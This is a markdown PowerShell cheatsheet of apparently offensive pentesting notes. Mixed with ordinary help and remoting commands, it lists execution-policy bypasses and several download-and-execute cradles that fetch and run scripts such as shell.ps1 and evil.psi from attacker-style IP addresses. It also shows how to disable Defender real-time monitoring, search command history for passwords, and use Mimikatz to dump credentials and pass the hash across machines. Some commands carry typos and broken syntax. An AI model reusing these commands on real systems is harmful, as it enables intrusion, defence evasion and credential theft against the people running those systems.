# Cheatsheet

## Help System

- Versin information: `$PSVersionTable`



- `Get-Help Get-Process`
- `help Get-Process`
- `Update-Help`



- `Get-Help remoting`
- `Get-Help about_*remot*`

## Basic Constructs

```
Cmdlets
Function
```

### List all Cmdlets

`Get-Command -CommandTyle Cmdlet`

## Aliases

`Get-Alias -Name ps`
`Get-Alias -Definition Get-Process`

## Check Environment

- Version info: `powershell -v 2.0 -c $psversiontable`
- Language mode: `$host.runspace.languagemode`
- Check if AppLocker is enabled: `Get-AppLockerPolicy -Local`

## Download Files
```powershell
powershell wget "http://example.com/abc.txt" -outfile "abc.txt"
```

## Execution Policy

- Not a security feature
- Used to avoid accidental script execution
- Can be bypass with:
  - `powershell -executionpolicy bypass .\example.ps1`
  - `powershell -c <cmd>`
  - `powershell -encodedcommand`
  - `powershell -enc`
  - `$env:PSExecutionPolicyPreference="bypass"`

> Ref https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6

## Modules

`Import-Module <path_to_module> -verbose`

- List all available modules: `Get-Module -ListAvailable -All`
  - List all modules available in: `$env:PSModulePath` 
- All functions exposed by a module: `Get-Command -Module <module_name>`

## Remote Script execution

- `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1');`
- `iex (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1');`
- `powershell -EncodedCommand <Base64EncodedCommand>`

```powershell
START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2/shell.ps1')
```
_/B prevents creation of a new window_

- Craft Download Cradles: https://github.com/danielbohannon/Invoke-CradleCrafter

More Download Cradles

- `$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://example.com/example.ps1');sleep 5;$resp=$ie.Document.Body.innerHTML;$ie.quit();iex $resp`
- `iex (iwr 'http://example.com/example.ps1')`
- `$h=New-Object -ComObject Msxm12.XMLHTTP;$h.open('GET', 'http://192.168.230.1/evil.psi1' ,$false);$h.send();iex $h. responseText`
- 
```powershell
$wr [System.NET.WebRequest]::Create("http://192.168.230.1/evil.psi")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader] ($r.GetResponseStream())) .ReadToEnd()```
```

## Command History (PSReadline)

```
cat (Get-PSReadlineOption).HistorySavePath | sls password
```
By default, the path is:
```
profile:\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Powershell Remoting

- Enabled by default from Windows Server 2012
  - `Enable-PSRemoting -Force`
- Admin privileges are required to connect
- `Get-Command -CommandType cmdlet -ParameterName computername`
- `Get-Command -CommandType cmdlet | Where-Object {$_Parameters.Keys --contains 'ComputerName' -and $_Parameters.Keys --contains 'Credential' -and $_Parameters.Keys --notcontains 'Session'}`

### WSMAN Protocol (Uses WinRM)

- Port 5985, 5986
- If target is in a workgroup, attacker's machine should trust target machine to send out credentials: 
  - Set-Item  WSMan:\localhost\client\trustedhosts -Value *
- `Invoke-Command -ScriptBlock {$env:ComputerName} -ComputerName example -Credential dominName/userName `
  - `-FilePath`
- New-PSSession
  - `New-PSSession -ComputerName -Credential`
  - `Get-PSSession`
  - `Enter-PSSession`

### One to One

- Uses PSSession
  - Interactive, stateful session
  - Run in a new process `wsmprovhost`

### Useful cmdlets

New-PSSession
Enter-PSSession

```
Set-MpPreference -DisableRealtimeMonitoring $true
New-PSSession -ComputerName instance

$sess = New-PSSession -ComputerName instance
Enter-PSSEssion - Session $sess
```
### One to Many (Fan-out Remoting)

- Non-interactive
- Parallel command execution
- Can execute scripts from files
- Usable to perform command execution without dropping exe onto disk
- Useful for passing and replying hashes, tickets and other AD attacks

Run commands:
```
Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName instance
```

Run scripts:
```
Invoke-Command -FilePath example.ps1 -ComputerName instance
```

Run functions installed on the remote box:
```
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName instance
```

Stateful commands:
```
$sess = New-PSSession -ComputerName instance
Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
```

Mimikatz (ReflectivePEInjection is used to load into memory)
```
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -DumpCerts
```

Pass the Hash
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<name_of_the_user> /domain:. /ntlm:<ntlmhash> /run:powershell.exe"'
```

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator  /domain:. /ntlm:<ntlmhash> /run:powershell.exe"'
```

Dump Creds from multiple machines
```
Invoke-Mimikatz -DumpCreds -ComputerName @("instance1", "instance2")
```

## Load PowerUp

```
powershell -ExecutionPolicy Bypass
Import-Module ./PowerUp.ps1
Invoke-AllChecks
```

## Active Directory

- [ADSI]
- .NET Class: `System.DirectoryServices.ActiveDirectory`
- Native Executable
- WMI

## System Information

- `Get-HotFix`e

